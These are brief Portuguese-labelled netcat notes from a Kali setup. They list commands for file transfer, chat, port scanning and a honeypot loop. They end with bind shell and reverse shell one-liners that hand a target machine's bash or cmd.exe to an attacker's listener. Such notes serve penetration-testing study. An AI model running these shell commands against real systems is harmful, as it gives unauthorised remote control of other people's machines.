NetCat

# Kali

/usr/share/windows-resources/binaries/nc.exe


# File Transfer

ataque = `nc -v $ip $porta < ncat.exe`

alvo = `nc.exe -vnlp $porta > ncat.exe`


# Chat

`nc -vlp $porta`


# Banner / Browser Text

`nc -vnlp 80 < inputfile`


# Port Scanning

`nc -vnz $ip 1-65535`

`nc -vnz 192.168.0.1 21-22`


# Honeypot

`while true; do nc -vnlp 21 < 21.txt 1>> 21.log 2>> 21.log;echo $date >> 21.log;done`

# bind shell

ataque
`nc -vnlp $porta -e /bin/bash`
`nc -vnlp $porta -e cmd.exe`
 
alvo
`nc.exe -vn $ip $porta`
`nc -vn $ip $porta`


# reverse shell

alvo 
`nc.exe -vn $ip $porta -e cmd.exe`

ataque 
`nc -vnlp $porta`